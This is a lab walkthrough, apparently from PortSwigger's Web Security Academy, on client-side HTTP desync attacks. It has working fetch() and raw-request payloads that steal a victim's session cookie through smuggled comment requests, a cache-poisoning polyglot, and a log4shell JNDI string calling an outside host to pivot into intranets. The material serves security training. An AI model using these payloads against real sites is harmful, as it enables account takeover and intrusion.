# Lab 21 — Client-side desync

> **Scope:** PortSwigger Web Security Academy / authorized lab environment only.

## Objective & Context

This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.

To solve the lab:

Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.

Identify a gadget that enables you to store text data within the application.

Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.

Use the stolen cookie to access the victim's account.
> **Hint**
This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling.

## Walkthrough

Identify a vulnerable endpoint

Notice that requests to / result in a redirect to /en.

Send the GET / request to Burp Repeater.

In Burp Repeater, use the tab-specific settings to disable the Update Content-Length option.

Convert the request to a POST request (right-click and select Change request method).

Change the Content-Length to 1 or higher, but leave the body empty.

Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified Content-Length.

Confirm the desync vector in Burp

Re-enable the Update Content-Length option.

Add an arbitrary request smuggling prefix to the body:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.h1-web-security-academy.net
Connection: close
Content-Length: CORRECT
```

```http
GET /hopefully404 HTTP/1.1
Foo: x
Add a normal request for GET / to the tab group, after your malicious request.
```

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

Change the Connection header of the first request to keep-alive.

Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync.

Replicate the desync vector in your browser

Open a separate instance of Chrome that is not proxying traffic through Burp.

Go to the exploit server.

Open the browser developer tools and go to the Network tab.

Ensure that the Preserve log option is selected and clear the log of any existing entries.

Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:

```python
fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
Note that we're intentionally triggering a CORS error to prevent the browser from following the redirect, then using the catch() method to continue the attack sequence.
```

On the Network tab, you should see two requests:

The main request, which has triggered a CORS error.

A request for the home page, which received a 404 response.

This confirms that the desync vector can be triggered from a browser.

Identify an exploitable gadget

Back in Burp's browser, visit one of the blog posts and observe that this lab contains a comment function.

From the Proxy > HTTP history, find the GET /en/post?postId=x request. Make note of the following:

The postId from the query string

Your session and _lab_analytics cookies

The csrf token

In Burp Repeater, use the desync vector from the previous section to try to capture your own arbitrary request in a comment. For example:

Request 1:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.h1-web-security-academy.net
Connection: keep-alive
Content-Length: CORRECT
```

```http
POST /en/post/comment HTTP/1.1
Host: YOUR-LAB-ID.h1-web-security-academy.net
Cookie: session=<SESSION-COOKIE>; _lab_analytics=YOUR-LAB-COOKIE
Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
Content-Type: x-www-form-urlencoded
Connection: keep-alive
```

csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=

Request 2:

```http
GET /capture-me HTTP/1.1
Host: YOUR-LAB-ID.h1-web-security-academy.net
Note that the number of bytes that you try to capture must be longer than the body of your POST /en/post/comment request prefix, but shorter than the follow-up request.
```

Back in the browser, refresh the blog post and confirm that you have successfully output the start of your GET /capture-me request in a comment.

Replicate the attack in your browser

Open a separate instance of Chrome that is not proxying traffic through Burp.

Go to the exploit server.

Open the browser developer tools and go to the Network tab.

Ensure that the Preserve log option is selected and clear the log of any existing entries.

Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:

```python
fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=<SESSION-COOKIE>; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
On the Network tab, you should see three requests:
```

The initial request, which has triggered a CORS error.

A request for /capture-me, which has been redirected to the post confirmation page.

A request to load the post confirmation page.

Refresh the blog post and confirm that you have successfully output the start of your own /capture-me request via a browser-initiated attack.

Exploit

Go to the exploit server.

In the Body panel, paste the script that you tested in the previous section.

Wrap the entire script in HTML <script> tags.

Store the exploit and click Deliver to victim.

Refresh the blog post and confirm that you have captured the start of the victim user's request.

Repeat this attack, adjusting the Content-Length of the nested POST /en/post/comment request until you have successfully output the victim's session cookie.

In Burp Repeater, send a request for /my-account using the victim's stolen cookie to solve the lab.

---Client-side cache poisoning
We previously covered how you can use a server-side desync to turn an on-site redirect into an open redirect, enabling you to hijack a JavaScript resource import. You can achieve the same effect just using a client-side desync, but it can be tricky to poison the right connection at the right time. It's much easier to use a desync to poison the browser's cache instead. This way, you don't need to worry about which connection it uses to load the resource.

In this section, we'll walk you through the process of constructing this attack. This involves the following high-level steps:

Identify a suitable CSD vector and desync the browser's connection.

Use the desynced connection to poison the cache with a redirect.

Trigger the resource import from the target domain.

Deliver a payload.
> **Note**
When testing this attack in a browser, make sure you clear your cache between each attempt (Settings > Clear browsing data > Cached images and files).

Poisoning the cache with a redirect
Once you've found a CSD vector and confirmed that you can replicate it in a browser, you need to identify a suitable redirect gadget. After that, poisoning the cache is fairly straightforward.

First, tweak your proof of concept so that the smuggled prefix will trigger a redirect to the domain where you'll host your malicious payload. Next, change the follow-up request to a direct request for the target JavaScript file.

The resulting code should look something like this:

<script>
    fetch('https://vulnerable-website.com/desync-vector', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() => {
        location = 'https://vulnerable-website.com/resources/target.js'
    })
</script>
This will poison the cache, albeit with an infinite redirect back to your script. You can confirm this by viewing the script in a browser and studying the Network tab in the developer tools.
> **Note**
You need to trigger the follow-up request via a top-level navigation to the target domain. Due to the way browsers partition their cache, issuing a cross-domain request using fetch() will poison the wrong cache.

Triggering the resource import
Sending your victim into an infinite loop may be mildly irritating, but it's not much of an exploit. You now need to further develop your script so that when the browser returns having already poisoned its cache, it is navigated to a page on the vulnerable site that will trigger the resource import. This is easily achieved using conditional statements to execute different code depending on whether the browser window has viewed your script already.

When the browser attempts to import the resource on the target site, it will use its poisoned cache entry and be redirected back to your malicious page for a third time.

Delivering a payload
At this stage, you've laid the foundations for an attack, but the final challenge is working out how to deliver a potentially harmful payload.

Initially, the victim's browser loads your malicious page as HTML and executes the nested JavaScript in the context of your own domain. When it eventually attempts to import the JavaScript resource on the target domain and gets redirected to your malicious page, you'll notice that the script doesn't execute. This is because you're still serving HTML when the browser is expecting JavaScript.

For an actual exploit, you need a way to serve plain JavaScript from the same endpoint, while ensuring that this only executes at this final stage to avoid interfering with the setup requests.

One possible approach is to create a polyglot payload by wrapping the HTML in JavaScript comments:

alert(1);
/*
<script>
    fetch( ... )
</script>
*/
When the browser loads the page as HTML, it will only execute the JavaScript in the <script> tags. When it eventually loads this in a JavaScript context, it will only execute the alert() payload, treating the rest of the content as arbitrary developer comments.

For more information about how we found this vulnerability in the wild, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling by PortSwigger Research.

Pivoting attacks against internal infrastructure
Most server-side desync attacks involve manipulating HTTP headers in a way that is only possible using tools like Burp Repeater. For example, it's not possible to make someone's browser send a request with a log4shell payload in the User-Agent header:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
This means that these attacks are normally limited to websites that you can access directly. However, if the website is vulnerable to client-side desyncs, you may be able to achieve the desired effect by inducing a victim's browser to send the following request:
```

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86
```

```http
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
As all of the requests originate from the victim's browser, this potentially enables you to pivot attacks against any website that they have access to. This includes sites located on trusted intranets or that are hidden behind IP-based restrictions. Some browsers are working on mitigations for these types of attack, but these are likely to only have partial coverage.
```
